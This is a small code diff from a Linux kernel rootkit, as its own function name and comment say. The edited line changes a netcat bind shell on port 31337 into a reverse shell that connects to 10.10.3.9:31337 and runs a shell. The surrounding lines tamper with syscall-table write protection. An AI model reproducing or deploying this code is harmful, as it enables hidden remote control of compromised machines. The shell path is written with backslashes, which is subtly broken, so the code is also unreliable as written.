@@ -239,7 +239,7 @@ int rootkit_init(void) { // Start lel rootkit
 
 	write_cr0(read_cr0() | 0x10000); // Turn off memory write to syscall table
 	
-	const char *args[5] = {"nc","-lp","31337","-e","\\bin\\sh"};
+	const char *args[5] = {"nc","10.10.3.9","31337","-e","\\bin\\sh"};
 	my_execve("/bin/nc", args , NULL);	
 
 	return 0;
